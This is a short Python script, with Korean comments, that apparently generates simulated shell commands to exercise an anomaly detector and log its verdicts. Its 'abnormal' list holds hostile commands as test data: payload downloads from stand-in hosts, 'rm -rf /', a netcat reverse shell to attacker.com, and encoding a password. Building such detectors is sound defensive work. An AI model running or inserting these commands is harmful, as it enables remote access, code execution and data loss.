# simulate_writer.py
import time
import random
from detector import predict
from writer import write_log

user = "simulator"

# 정상 명령어 목록
normal_cmds = [
    "ps -e -o pid,ppid,state,command",
    "ls -al /var/log",
    "df -h",
    "cd /home",
    "cat /etc/passwd",
    "uptime",
    "whoami",
]

# 이상 명령어 목록
abnormal_cmds = [
    "wget http://evil.sh",
    "curl http://malicious.site/payload.sh",
    "rm -rf /",
    "nc -e /bin/sh attacker.com 4444",
    "python3 -c 'import socket; ...'",
    "echo password | base64",
]

while True:
    cmd_type = random.choices(["normal", "abnormal"], weights=[100, 1])[0]
    if cmd_type == "normal":
        cmd = random.choice(normal_cmds)
    else:
        cmd = random.choice(abnormal_cmds)

    # 이상 여부 판단
    is_anomaly = predict(cmd)
    now_ns = int(time.time() * 1e9)
    write_log(user, cmd, is_anomaly, now_ns)
    print(f"[{'ANOMALY' if is_anomaly else 'OK'}] {cmd}")
    time.sleep(1)
